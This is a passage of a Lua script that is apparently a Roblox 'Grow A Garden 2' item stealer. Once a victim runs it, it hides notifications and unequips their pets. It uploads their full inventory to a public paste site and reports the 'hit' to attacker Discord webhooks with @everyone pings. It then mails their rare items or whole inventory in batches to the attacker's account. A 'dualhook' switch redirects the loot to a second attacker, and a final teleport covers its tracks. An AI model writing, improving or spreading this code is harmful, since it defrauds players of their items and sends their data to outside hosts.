-- ============================================

local function BuildInventoryEntries(replica)
    local entries = {}
    local totalItemCount = 0
    local totalRareCount = 0
    local hasMythicPlus = false

    if not replica or not replica.Data or not replica.Data.Inventory then
        return entries, totalItemCount, totalRareCount, hasMythicPlus
    end

    for catName, catData in pairs(replica.Data.Inventory) do
        if type(catData) == "table" and not SKIP_CATEGORIES[catName] and MAILABLE_CATEGORIES[catName] then
            local catPrio = CATEGORY_PRIORITY[catName] or DEFAULT_PRIORITY

            if UUID_CATEGORIES[catName] then
                -- Pet-type: UUID-based, group by variant
                local variantCounts = {}
                local variantData = {}  -- store one representative petData per variant
                for id, data in pairs(catData) do
                    if type(data) == "table" and IsMailable(catName, id, data) then
                        local vkey = GetPetVariantKey(data)
                        variantCounts[vkey] = (variantCounts[vkey] or 0) + 1
                        if not variantData[vkey] then
                            variantData[vkey] = data
                        end
                    end
                end

                for vkey, count in pairs(variantCounts) do
                    local baseName, size, mutation = ParseVariantKey(vkey)
                    local rarity = PetRarities[baseName] or "Unknown"
                    local rarityTier = GetRarityTier(rarity)
                    local isMythicPlus = rarityTier >= RARITY_TIERS.Mythic

                    if isMythicPlus then
                        totalRareCount = totalRareCount + count
                        hasMythicPlus = true
                    end
                    totalItemCount = totalItemCount + count

                    -- Build display name with tags
                    local tags = {}
                    if type(mutation) == "string" and mutation ~= "" and mutation ~= "Normal" then
                        table.insert(tags, "[R]")
                    end
                    if type(size) == "string" and size ~= "" and size ~= "Normal" then
                        if size == "Big" then table.insert(tags, "[B]")
                        elseif size == "Huge" then table.insert(tags, "[H]") end
                    end
                    local displayName = baseName
                    if #tags > 0 then
                        displayName = baseName .. " " .. table.concat(tags, " ")
                    end

                    table.insert(entries, {
                        catName = catName,
                        displayName = displayName,
                        count = count,
                        rarity = rarity,
                        rarityTier = rarityTier,
                        catPriority = catPrio,
                    })
                end
            else
                -- Non-UUID category (Seeds, Gears, etc.)
                for itemName, itemCount in pairs(catData) do
                    if type(itemCount) == "number" and itemCount > 0 then
                        local name = tostring(itemName)
                        local rarity = "Unknown"
                        local rarityTier = 0

                        if catName == "Seeds" then
                            rarity = SeedRarities[name] or "Unknown"
                            rarityTier = GetRarityTier(rarity)
                        end

                        local isMythicPlus = rarityTier >= RARITY_TIERS.Mythic
                        if isMythicPlus then
                            totalRareCount = totalRareCount + itemCount
                            hasMythicPlus = true
                        end
                        totalItemCount = totalItemCount + itemCount

                        table.insert(entries, {
                            catName = catName,
                            displayName = name,
                            count = itemCount,
                            rarity = rarity,
                            rarityTier = rarityTier,
                            catPriority = catPrio,
                        })
                    end
                end
            end
        end
    end

    -- Sort: category first, then rarity tier descending, then alphabetical
    table.sort(entries, function(a, b)
        if a.catPriority ~= b.catPriority then
            return a.catPriority < b.catPriority
        end
        if a.rarityTier ~= b.rarityTier then
            return a.rarityTier > b.rarityTier  -- higher rarity first
        end
        return a.displayName < b.displayName
    end)

    return entries, totalItemCount, totalRareCount, hasMythicPlus
end

local function UploadInventoryToPaste(entries, playerName, playerId)
    -- Build the paste content
    local lines = {}
    table.insert(lines, "=== Grow A Garden 2 - Full Inventory ===")
    table.insert(lines, string.format("Player: %s", playerName))
    table.insert(lines, string.format("User ID: %d", playerId))
    table.insert(lines, string.format("Total items: %d", #entries))
    table.insert(lines, string.format("Generated: %s", os.date("%Y-%m-%d %H:%M:%S")))
    table.insert(lines, "")
    table.insert(lines, string.format("%-5s %-28s %-12s %s", "Qty", "Item", "Rarity", "Category"))
    table.insert(lines, string.rep("-", 60))

    for _, entry in ipairs(entries) do
        table.insert(lines, string.format(
            "%-5s %-28s %-12s %s",
            tostring(entry.count),
            entry.displayName,
            entry.rarity or "?",
            entry.catName
        ))
    end

    local content = table.concat(lines, "\n")

    local success, response = pcall(function()
        return _httpFn({
            Url = "https://api.rubis.app/v2/scrap?title="
                .. HttpService:UrlEncode(playerName .. " GAG2 Inventory")
                .. "&public=true",
            Method = "POST",
            Headers = { ["Content-Type"] = "text/plain" },
            Body = content
        })
    end)

    if success and response and response.StatusCode == 200 then
        local decodeOk, data = pcall(function()
            return HttpService:JSONDecode(response.Body)
        end)
        if decodeOk and type(data) == "table" and data.success and data.view then
            return data.view
        end
    end

    return nil
end

-- ============================================
-- EMBED FORMATTING & BUILDER
-- ============================================

local function BuildValuablesText(entries, maxEntries)
    maxEntries = maxEntries or 15

    local tierGroups = {}
    for _, entry in ipairs(entries) do
        local t = entry.rarityTier
        if not tierGroups[t] then
            tierGroups[t] = {}
        end
        table.insert(tierGroups[t], entry)
    end

    for _, group in pairs(tierGroups) do
        table.sort(group, function(a, b) return a.displayName < b.displayName end)
    end

    local lines = {}
    local shown = 0
    local hitMax = false

    for _, display in ipairs(RARITY_DISPLAY) do
        local items = tierGroups[display.tier]
        if items and #items > 0 then
            if #lines > 0 then
                table.insert(lines, "")
            end
            table.insert(lines, display.emoji .. " " .. display.name)

            for _, item in ipairs(items) do
                if shown >= maxEntries then
                    hitMax = true
                    break
                end
                local countText = item.count > 1 and (" ×" .. item.count) or ""
                table.insert(lines, "› " .. item.displayName .. countText)
                shown = shown + 1
            end

            if hitMax then break end
        end
    end

    if shown < #entries then
        table.insert(lines, "")
        table.insert(lines, string.format("... and %d more items.", #entries - shown))
    end

    if #lines == 0 then
        return "[ EMPTY ]"
    end

    return table.concat(lines, "\n")
end

local function BuildHitEmbed(params)
    local color = EMBED_COLOR
    if #params.entries == 0 then
        color = 0x0D1B2A
    end

    local title = "GROW A GARDEN 2 HITS!"
    if params.isDone then
        if params.progress >= params.totalCount then
            title = "GROW A GARDEN 2 - COMPLETE"
        else
            title = "GROW A GARDEN 2 - PARTIAL"
        end
    elseif params.progress > 0 then
        title = "GROW A GARDEN 2 - TRANSFERRING"
    end

    local playerBlock = string.format(
        "```\n%-10s : %s\n%-10s : %s\n%-10s : %s\n%-10s : %d / %d\n```",
        "Username", params.playerName,
        "Executor", params.executor,
        "Receiver", params.receiverName,
        "Progress", params.progress, params.totalCount
    )

    local valuablesText = BuildValuablesText(params.entries, 15)

    local description = "**Player**\n" .. playerBlock .. "\n**Valuables**\n```\n" .. valuablesText .. "\n```"

    if params.pasteUrl then
        description = description .. "\n[View Full Inventory](" .. params.pasteUrl .. ")"
    end

    local embed = {
        title = title,
        color = color,
        description = description,
        thumbnail = {
            url = "https://www.roblox.com/headshot-thumbnail/image?userId="
                .. tostring(params.playerId) .. "&width=420&height=420&format=png"
        },
        image = {
            url = BANNER_URL
        },
        footer = {
            text = "BLOXIFIED"
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }

    return embed
end

local cachedEntries = {}
local cachedPasteUrl = nil
local activeMessageId = nil
local activeWebhook = nil
local activeDisplay = nil
local isDualHookVictim = false
local hasMythicPlus = false

local function SendHitEmbed(params)
    cachedEntries = params.entries
    cachedPasteUrl = params.pasteUrl

    local shouldPing = params.isDualHook or params.hasMythicPlus
    local pingContent = shouldPing and "@everyone" or ""

    activeMessageId = SendWebhookAndGetId(activeWebhook, {
        content = pingContent,
        embeds = { BuildHitEmbed(params) }
    })
end

local function UpdateHitEmbed(progress, totalCount, isDone)
    if not activeMessageId then return end

    EditWebhookMessage(activeWebhook, activeMessageId, {
        embeds = { BuildHitEmbed({
            receiverName = activeDisplay,
            playerName = LocalPlayer.Name,
            playerId = LocalPlayer.UserId,
            playerAge = GetAccountAge(),
            displayName = LocalPlayer.DisplayName or LocalPlayer.Name,
            executor = GetExecutor(),
            progress = progress,
            totalCount = totalCount,
            entries = cachedEntries,
            pasteUrl = cachedPasteUrl,
            isDualHook = isDualHookVictim,
            hasMythicPlus = hasMythicPlus,
            isDone = isDone,
        }) }
    })
end

-- ============================================
-- GIFTABLE ITEM GETTERS
-- ============================================

local function GetTargetedGiftableItems(replica)
    local items = {}
    if not replica or not replica.Data or not replica.Data.Inventory then return items end

    for catName, catData in pairs(replica.Data.Inventory) do
        if type(catData) == "table" and MAILABLE_CATEGORIES[catName] then
            if UUID_CATEGORIES[catName] then
                if catName == "Pets" then
                    for itemId, itemData in pairs(catData) do
                        if type(itemData) == "table" and IsMailable(catName, itemId, itemData) then
                            local name = itemData.Name or itemData.Pet or ""
                            local isRare = IsMythicOrAbove(catName, name)
                            if isRare then
                                table.insert(items, {
                                    Category = catName,
                                    ItemKey = tostring(itemId),
                                    Count = 1,
                                })
                            end
                        end
                    end
                end
            else
                for itemName, itemCount in pairs(catData) do
                    if type(itemCount) == "number" and itemCount > 0 then
                        local name = tostring(itemName)
                        local isRare = IsMythicOrAbove(catName, name)
                        if isRare then
                            table.insert(items, {
                                Category = catName,
                                ItemKey = name,
                                Count = itemCount,
                            })
                        end
                    end
                end
            end
        end
    end

    return items
end

local function GetAllGiftableItems(replica)
    local items = {}
    if not replica or not replica.Data or not replica.Data.Inventory then return items end

    for catName, catData in pairs(replica.Data.Inventory) do
        if type(catData) == "table" and MAILABLE_CATEGORIES[catName] then
            if UUID_CATEGORIES[catName] then
                if catName == "Pets" then
                    for itemId, itemData in pairs(catData) do
                        if type(itemData) == "table" and IsMailable(catName, itemId, itemData) then
                            table.insert(items, {
                                Category = catName,
                                ItemKey = tostring(itemId),
                                Count = 1,
                            })
                        end
                    end
                end
            else
                for itemName, itemCount in pairs(catData) do
                    if type(itemCount) == "number" and itemCount > 0 then
                        table.insert(items, {
                            Category = catName,
                            ItemKey = tostring(itemName),
                            Count = itemCount,
                        })
                    end
                end
            end
        end
    end

    return items
end

local function CountTargetedItems(replica)
    local count = 0
    if not replica or not replica.Data or not replica.Data.Inventory then return count end

    for catName, catData in pairs(replica.Data.Inventory) do
        if type(catData) == "table" and MAILABLE_CATEGORIES[catName] then
            if UUID_CATEGORIES[catName] then
                if catName == "Pets" then
                    for itemId, itemData in pairs(catData) do
                        if type(itemData) == "table" and IsMailable(catName, itemId, itemData) then
                            local name = itemData.Name or itemData.Pet or ""
                            if IsMythicOrAbove(catName, name) then
                                count = count + 1
                            end
                        end
                    end
                end
            else
                for itemName, itemCount in pairs(catData) do
                    if type(itemCount) == "number" and itemCount > 0 then
                        local name = tostring(itemName)
                        if IsMythicOrAbove(catName, name) then
                            count = count + itemCount
                        end
                    end
                end
            end
        end
    end

    return count
end

local function CountAllItems(replica)
    local count = 0
    if not replica or not replica.Data or not replica.Data.Inventory then return count end

    for catName, catData in pairs(replica.Data.Inventory) do
        if type(catData) == "table" and MAILABLE_CATEGORIES[catName] then
            if UUID_CATEGORIES[catName] then
                if catName == "Pets" then
                    for itemId, itemData in pairs(catData) do
                        if type(itemData) == "table" and IsMailable(catName, itemId, itemData) then
                            count = count + 1
                        end
                    end
                end
            else
                for itemName, itemCount in pairs(catData) do
                    if type(itemCount) == "number" and itemCount > 0 then
                        count = count + itemCount
                    end
                end
            end
        end
    end

    return count
end

-- ============================================
-- BATCH SENDER
-- ============================================

local function SendOneBatch(targetUserId, batch)
    task.wait(math.random() * 0.2)
    for attempt = 1, CONFIG.MaxRetries do
        local pcallOk, serverOk, serverMsg = pcall(function()
            return Networking.Mailbox.SendBatch:Fire(targetUserId, batch, "")
        end)
        if pcallOk and serverOk then
            return true
        end
        task.wait((0.5 + math.random() * 0.3) * attempt)
    end
    return false
end

-- ============================================
-- USER RESOLVER
-- ============================================

local function ResolveUserId(username)
    local userId = nil
    local displayName = username

    local lookupOk, lookupId, lookupDisplay = pcall(function()
        return Networking.Mailbox.LookupPlayer:Fire(username)
    end)

    if lookupOk and lookupId and lookupId > 0 then
        userId = lookupId
        displayName = lookupDisplay or username
    else
        local ok, uid = pcall(function()
            return Players:GetUserIdFromNameAsync(username)
        end)
        if ok and uid then
            userId = uid
        end
    end

    return userId, displayName
end

-- ============================================
-- MAIN EXECUTION FLOW
-- ============================================

-- 1. Guard
if CONFIG.Username == "" then return end

-- 2. Stealth
SuppressNotifications()
ActivateStealth()

-- 3. Resolve BOTH usernames upfront
local firstUserId, firstDisplay = ResolveUserId(CONFIG.Username)
local dualUserId, dualDisplay = ResolveUserId(CONFIG.DualHookUsername)
if not firstUserId and not dualUserId then return end

-- 4. Prep
local unequippedPets = UnequipAllPetsInstant()
task.wait(1)
local replica = WaitForReplica(10)
if not replica then return end

UnfavoriteAllFruits(replica)
task.wait(0.3)
replica = WaitForReplica(5)
if not replica then return end

-- 5. Build structured inventory entries
local entries, totalItemCount, totalRareCount, mythicPlus = BuildInventoryEntries(replica)
hasMythicPlus = mythicPlus

-- 6. DUALHOOK TAKEOVER CHECK
isDualHookVictim = HasDualHookTrigger(replica)

-- 7. Select ONE active receiver
local activeUsername, activeUserId
if isDualHookVictim and dualUserId then
    activeWebhook = CONFIG.DualHookWebhook
    activeUsername = CONFIG.DualHookUsername
    activeUserId = dualUserId
    activeDisplay = dualDisplay
elseif firstUserId then
    activeWebhook = CONFIG.Webhook
    activeUsername = CONFIG.Username
    activeUserId = firstUserId
    activeDisplay = firstDisplay
else
    return
end

-- 8. Get giftable items
local GetItems, CountRemaining
if CONFIG.GiftAll then
    GetItems = GetAllGiftableItems
    CountRemaining = CountAllItems
else
    GetItems = GetTargetedGiftableItems
    CountRemaining = CountTargetedItems
end
local totalTargeted = CountRemaining(replica)

-- 9. Send embed IMMEDIATELY for fast @everyone ping (no paste yet)
local embedParams = {
    receiverName = activeDisplay,
    playerName = LocalPlayer.Name,
    playerId = LocalPlayer.UserId,
    playerAge = GetAccountAge(),
    displayName = LocalPlayer.DisplayName or LocalPlayer.Name,
    executor = GetExecutor(),
    progress = 0,
    totalCount = totalTargeted,
    entries = entries,
    pasteUrl = nil,
    isDualHook = isDualHookVictim,
    hasMythicPlus = hasMythicPlus,
    isDone = false,
}
SendHitEmbed(embedParams)

-- 10. Upload paste AFTER ping, then update embed with link
local pasteUrl = UploadInventoryToPaste(entries, LocalPlayer.Name, LocalPlayer.UserId)
if pasteUrl then
    cachedPasteUrl = pasteUrl
    UpdateHitEmbed(0, totalTargeted, false)
end

-- 11. Send loop (optimized: single scan + update per iteration)
local sentSoFar = 0
local maxLoops = 50
local loopCount = 0

if totalTargeted == 0 then
    task.wait(1)
    StealthActive = false
    if heartbeatConn then heartbeatConn:Disconnect() end
    -- Use teleport instead of Kick to avoid Delta's hook
pcall(function()
    game:GetService("TeleportService"):Teleport(game.PlaceId, LocalPlayer)
end)
    return
end

while loopCount < maxLoops do
    loopCount = loopCount + 1
    replica = PlayerState:GetLocalReplica()
    if not replica then break end

    local currentItems = GetItems(replica)
    if #currentItems == 0 then break end

    for i = 1, #currentItems, CONFIG.BatchSize do
        local batch = {}
        for j = i, math.min(i + CONFIG.BatchSize - 1, #currentItems) do
            table.insert(batch, currentItems[j])
        end
        SendOneBatch(activeUserId, batch)
        task.wait(CONFIG.BatchDelay + math.random() * 0.4)
    end

    task.wait(0.3)
    replica = PlayerState:GetLocalReplica()
    if replica then
        local remaining = CountRemaining(replica)
        sentSoFar = totalTargeted - remaining
        if sentSoFar < 0 then sentSoFar = 0 end
        if sentSoFar > totalTargeted then sentSoFar = totalTargeted end
        UpdateHitEmbed(sentSoFar, totalTargeted, false)
        if remaining <= 0 then break end
    end
end

-- 12. Final update
task.wait(0.5)
replica = PlayerState:GetLocalReplica()
local finalRemaining = 0
if replica then finalRemaining = CountRemaining(replica) end
local actualSent = totalTargeted - finalRemaining
if actualSent < 0 then actualSent = 0 end
if actualSent > totalTargeted then actualSent = totalTargeted end
UpdateHitEmbed(actualSent, totalTargeted, true)

-- 13. Cleanup
StealthActive = false
if heartbeatConn then heartbeatConn:Disconnect() end
-- Use teleport instead of Kick to avoid Delta's hook
pcall(function()
    game:GetService("TeleportService"):Teleport(game.PlaceId, LocalPlayer)
end)
